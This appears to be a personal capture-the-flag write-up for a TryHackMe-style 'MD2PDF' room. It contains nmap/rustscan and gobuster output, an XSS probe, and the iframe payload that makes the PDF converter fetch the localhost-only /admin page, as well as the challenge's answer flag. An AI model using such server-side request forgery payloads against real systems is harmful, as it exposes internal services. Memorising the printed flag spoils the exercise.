----
TopTierConversions LTD is proud to present its latest product launch.
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/c53da808dba7b45a03b79dacf587ebb6.png)


###  Challenge

 Start Machine

Hello Hacker!

TopTierConversions LTD is proud to announce its latest and greatest product launch: MD2PDF.

This easy-to-use utility converts markdown files to PDF and is totally secure! Right...?

_Note: Please allow 3-5 minutes for the VM to boot up fully before attempting the challenge._

Answer the questions below

```
┌──(witty㉿kali)-[~/bug_hunter]
└─$ ping 10.10.47.162
PING 10.10.47.162 (10.10.47.162) 56(84) bytes of data.
64 bytes from 10.10.47.162: icmp_seq=1 ttl=63 time=203 ms
^C
--- 10.10.47.162 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 203.214/203.214/203.214/0.000 ms

linux machine

┌──(witty㉿kali)-[~/bug_hunter]
└─$ rustscan -a 10.10.47.162 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.47.162:22
Open 10.10.47.162:80
Open 10.10.47.162:5000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
WARNING: Service 10.10.47.162:80 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
WARNING: Service 10.10.47.162:5000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 18:00 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:00
Completed Parallel DNS resolution of 1 host. at 18:00, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:00
Scanning 10.10.47.162 [3 ports]
Discovered open port 22/tcp on 10.10.47.162
Discovered open port 80/tcp on 10.10.47.162
Discovered open port 5000/tcp on 10.10.47.162
Completed Connect Scan at 18:00, 0.20s elapsed (3 total ports)
Initiating Service scan at 18:00
Scanning 3 services on 10.10.47.162
Completed Service scan at 18:00, 8.49s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.47.162.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 6.68s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.40s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
Nmap scan report for 10.10.47.162
Host is up, received user-set (0.20s latency).
Scanned at 2023-02-16 18:00:28 EST for 16s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 716ab4e2a1398601b20d6922a1c7737c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVLVBeAGW0FFxgNsxXHleKzyx+QRcvAfE4n3pLPg5FaVIAc/P0a5jUNAFNtb/C+L6EjA0YlJ8qWmcfW3BQuOWwFa2m5XMOcOGilYX/S4XtRGlGd1GBcBcioUgUoiejG2EDTpyXOdfvYmZHOcg6uxN7ndhVRbMDs9/oukb2U9xs7B7+5qlbyBp2HuNl0JgtOaNG3JRl5zUy+tFx7RQINYH1EK8DFCkOd54xTKLTmaUbizACa908jUHyRrlmPnKbI1a07VCZCmaCjjo1X8sQwThUuYu1GbDNKDk5N+X5QDGEvkHOpLRDzUAjI/JKvc3fNYvKR8tB25og/bzwVdRaB1wgq3x8y4Ieei+7zrgs/FtD+IOi+adScxaTCRIOqRU9RN9TarsTLf+HVVZSU15P9wZliOCP0J1+i53xJG324IrMdEYzudEjgjcwr4Dw1kZwkcGG4K1y3Qo8+sIeusEekzTWPjrV6QOeEh5ic3izUVhqJfwsiawwrIAUzH2RJ5rwQsU=
|   256 d401d9259b5f2081a8ff4c0a490dcfd8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKEmphwF7J6E9Ql1lP7dbKpEKfYhFaFtJaa1TBR3auJ+2qhYExjg1daXLgXtofxIQDY1/Euw8C7tpJ80Wf3lVhM=
|   256 88801975b1f015672b13fc236e24ed95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH2sQVv7nYhhlmaV/y/4YB6z5iJbDV17UOTZa2W1Lxj7
80/tcp   open  rtsp    syn-ack
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2660
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta
|     name="viewport"
|     content="width=device-width, initial-scale=1, shrink-to-fit=no"
|     <link
|     rel="stylesheet"
|     href="./static/codemirror.min.css"/>
|     <link
|     rel="stylesheet"
|     href="./static/bootstrap.min.css"/>
|     <title>MD2PDF</title>
|     </head>
|     <body>
|     <!-- Navigation -->
|     <nav class="navbar navbar-expand-md navbar-dark bg-dark">
|     <div class="container">
|     class="navbar-brand" href="/"><span class="">MD2PDF</span></a>
|     </div>
|     </nav>
|     <!-- Page Content -->
|     <div class="container">
|     <div class="">
|     <div class="card mt-4">
|     <textarea class="form-control" name="md" id="md"></textarea>
|     </div>
|     <div class="mt-3
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|_    Content-Length: 0
|_http-title: MD2PDF
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
5000/tcp open  rtsp    syn-ack
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2624
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta
|     name="viewport"
|     content="width=device-width, initial-scale=1, shrink-to-fit=no"
|     <link
|     rel="stylesheet"
|     href="./assets/codemirror.min.css"/>
|     <link
|     rel="stylesheet"
|     href="./assets/bootstrap.min.css"/>
|     <title>MD2PDF</title>
|     </head>
|     <body>
|     <!-- Navigation -->
|     <nav class="navbar navbar-expand-md navbar-dark bg-dark">
|     <div class="container">
|     class="navbar-brand" href="/"><span class="">MD2PDF</span></a>
|     </div>
|     </nav>
|     <!-- Page Content -->
|     <div class="container">
|     <div class="">
|     <div class="card mt-4">
|     <textarea class="form-control" name="md" id="md"></textarea>
|     </div>
|     <div class="mt-3
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|_    Content-Length: 0
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.93%I=7%D=2/16%Time=63EEB593%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,AB5,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20ch
SF:arset=utf-8\r\nContent-Length:\x202660\r\n\r\n<!DOCTYPE\x20html>\n<html
SF:\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"ut
SF:f-8\"\x20/>\n\x20\x20\x20\x20<meta\n\x20\x20\x20\x20\x20\x20name=\"view
SF:port\"\n\x20\x20\x20\x20\x20\x20content=\"width=device-width,\x20initia
SF:l-scale=1,\x20shrink-to-fit=no\"\n\x20\x20\x20\x20/>\n\n\x20\x20\x20\x2
SF:0<link\n\x20\x20\x20\x20\x20\x20rel=\"stylesheet\"\n\x20\x20\x20\x20\x2
SF:0\x20href=\"\./static/codemirror\.min\.css\"/>\n\n\x20\x20\x20\x20<link
SF:\n\x20\x20\x20\x20\x20\x20rel=\"stylesheet\"\n\x20\x20\x20\x20\x20\x20h
SF:ref=\"\./static/bootstrap\.min\.css\"/>\n\n\x20\x20\x20\x20\n\x20\x20\x
SF:20\x20<title>MD2PDF</title>\n\x20\x20</head>\n\n\x20\x20<body>\n\x20\x2
SF:0\x20\x20<!--\x20Navigation\x20-->\n\x20\x20\x20\x20<nav\x20class=\"nav
SF:bar\x20navbar-expand-md\x20navbar-dark\x20bg-dark\">\n\x20\x20\x20\x20\
SF:x20\x20<div\x20class=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<a
SF:\x20class=\"navbar-brand\"\x20href=\"/\"><span\x20class=\"\">MD2PDF</sp
SF:an></a>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20</nav>\n\n\x20
SF:\x20\x20\x20<!--\x20Page\x20Content\x20-->\n\x20\x20\x20\x20<div\x20cla
SF:ss=\"container\">\n\x20\x20\x20\x20\x20\x20<div\x20class=\"\">\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<div\x20class=\"card\x20mt-4\">\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<textarea\x20class=\"form-control\"\x20name=
SF:\"md\"\x20id=\"md\"></textarea>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>
SF:\n\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\"mt-3\x20")%r(HTTPOp
SF:tions,69,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OPTIONS\r\nContent-Length:\x200
SF:\r\n\r\n")%r(RTSPRequest,69,"RTSP/1\.0\x20200\x20OK\r\nContent-Type:\x2
SF:0text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OPTIONS\r\nC
SF:ontent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,13F,"HTTP/1\.0\x20404
SF:\x20NOT\x20FOUND\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20232\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD
SF:\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<
SF:h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found
SF:\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manu
SF:ally\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p
SF:>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.93%I=7%D=2/16%Time=63EEB593%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A91,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20
SF:charset=utf-8\r\nContent-Length:\x202624\r\n\r\n<!DOCTYPE\x20html>\n<ht
SF:ml\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"
SF:utf-8\"\x20/>\n\x20\x20\x20\x20<meta\n\x20\x20\x20\x20\x20\x20name=\"vi
SF:ewport\"\n\x20\x20\x20\x20\x20\x20content=\"width=device-width,\x20init
SF:ial-scale=1,\x20shrink-to-fit=no\"\n\x20\x20\x20\x20/>\n\n\x20\x20\x20\
SF:x20<link\n\x20\x20\x20\x20\x20\x20rel=\"stylesheet\"\n\x20\x20\x20\x20\
SF:x20\x20href=\"\./assets/codemirror\.min\.css\"/>\n\n\x20\x20\x20\x20<li
SF:nk\n\x20\x20\x20\x20\x20\x20rel=\"stylesheet\"\n\x20\x20\x20\x20\x20\x2
SF:0href=\"\./assets/bootstrap\.min\.css\"/>\n\n\x20\x20\x20\x20\n\x20\x20
SF:\x20\x20<title>MD2PDF</title>\n\x20\x20</head>\n\n\x20\x20<body>\n\x20\
SF:x20\x20\x20<!--\x20Navigation\x20-->\n\x20\x20\x20\x20<nav\x20class=\"n
SF:avbar\x20navbar-expand-md\x20navbar-dark\x20bg-dark\">\n\x20\x20\x20\x2
SF:0\x20\x20<div\x20class=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<a\x20class=\"navbar-brand\"\x20href=\"/\"><span\x20class=\"\">MD2PDF</
SF:span></a>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20</nav>\n\n\x
SF:20\x20\x20\x20<!--\x20Page\x20Content\x20-->\n\x20\x20\x20\x20<div\x20c
SF:lass=\"container\">\n\x20\x20\x20\x20\x20\x20<div\x20class=\"\">\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20<div\x20class=\"card\x20mt-4\">\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<textarea\x20class=\"form-control\"\x20nam
SF:e=\"md\"\x20id=\"md\"></textarea>\n\x20\x20\x20\x20\x20\x20\x20\x20</di
SF:v>\n\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\"mt-3\x20")%r(RTSP
SF:Request,69,"RTSP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20ch
SF:arset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nContent-Length:\x2
SF:00\r\n\r\n")%r(HTTPOptions,69,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\
SF:nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,13F,"HTTP/1\.0\x204
SF:04\x20NOT\x20FOUND\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nC
SF:ontent-Length:\x20232\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//D
SF:TD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</title>\
SF:n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20fou
SF:nd\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20ma
SF:nually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.<
SF:/p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.72 seconds

┌──(witty㉿kali)-[~/bug_hunter]
└─$ gobuster -t 32 dir -e -k -u http://10.10.47.162/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.47.162/
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/02/16 18:07:31 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.47.162/admin                (Status: 403) [Size: 166]
http://10.10.47.162/convert              (Status: 405) [Size: 178]
Progress: 39098 / 220561 (17.73%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/02/16 18:13:33 Finished
===============================================================

http://10.10.47.162/admin

Forbidden

This page can only be seen internally (localhost:5000)

http://10.10.47.162:5000/

<script>alert(document.domain)</script>

conveting to pdf just get blank


https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp


<html>
  <script>
  var secret = "31337s3cr37t";
  </script>

  <iframe id="if1" src="http://localhost:5000/admin"></iframe>
  <iframe id="if2" src="http://localhost:5000/admin"></iframe>
  <iframe id="if3" srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
  <iframe id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>

  <script>
  function access_children_vars(){
    alert(if1.secret);
    alert(if2.secret);
    alert(if3.secret);
    alert(if4.secret);
  }
  setTimeout(access_children_vars, 3000);
  </script>
</html>

Convert to PDF

flag{1f4a2b6ffeaf4707c43885d704eaee4b} flag{1f4a2b6ffeaf4707c43885d704eaee4b}

so just convert to pdf

<iframe src="http://localhost:5000/admin"></iframe>

and get it :)

```

![[Pasted image 20230216180135.png]]
![[Pasted image 20230216180145.png]]

What is the flag?

*flag{1f4a2b6ffeaf4707c43885d704eaee4b}*


[[AD Certificate Templates]]